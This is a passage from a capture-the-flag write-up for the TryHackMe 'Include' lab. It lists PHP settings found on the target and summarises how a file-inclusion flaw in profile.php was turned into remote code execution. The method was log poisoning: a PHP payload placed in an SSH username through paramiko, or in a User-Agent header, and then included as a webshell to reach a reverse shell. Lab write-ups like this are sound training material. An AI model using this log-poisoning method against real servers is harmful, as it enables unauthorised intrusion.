| `allow_url_include` | **On** | non-standard! `http://`, `data://` wrappers allowed in include — but the `uploads/` prefix made it unusable (a wrapper must be at the start of the path) |
| `disable_functions` | only `pcntl_*` | `system/exec/shell_exec` are alive — which is exactly what I used |
| `display_errors` / `display_startup_errors` | Off | why every fatal looked like "200/500 with an empty body" instead of an error message |
| `log_errors` | On | errors went to the log |
| `short_open_tag` | **Off** | good to remember for payloads: only full `<?php` works, `<?` stays text (but `<?=` always works) |
| `memory_limit` 128M, `max_execution_time` 30s | — | include-recursion limits (profile.php self-inclusion → 500 within 128M) |

Flag captured. Machine completed:

![[Screenshot_20261101_195531.png]]

### Summary: Log poisoning on THM "Include"  — what was tried

**Context**

`profile.php?img=` on :50000 is an include-family vulnerability (proven: PHP files returned rendered HTML when "read", and profile.php reading itself → 500 from recursion). Non-PHP files are returned raw. Which means any log containing `<?php...?>` in its content = RCE. And that's exactly how we got RCE: through the SSH log — a failed login left a `<?php ?>` entry in it, which was then executed as a webshell → reverse shell.

**Log write channels — status**

| Channel | Payload write |
| --- | --- |
| Apache access.log | UA writes the payload as-is |
| Apache error.log | — |
| /var/log/auth.log | — |
| Hardened sshd-username | `paramiko auth_password('<?php...payload...?>', 'x')` → auth fail, connection went through |
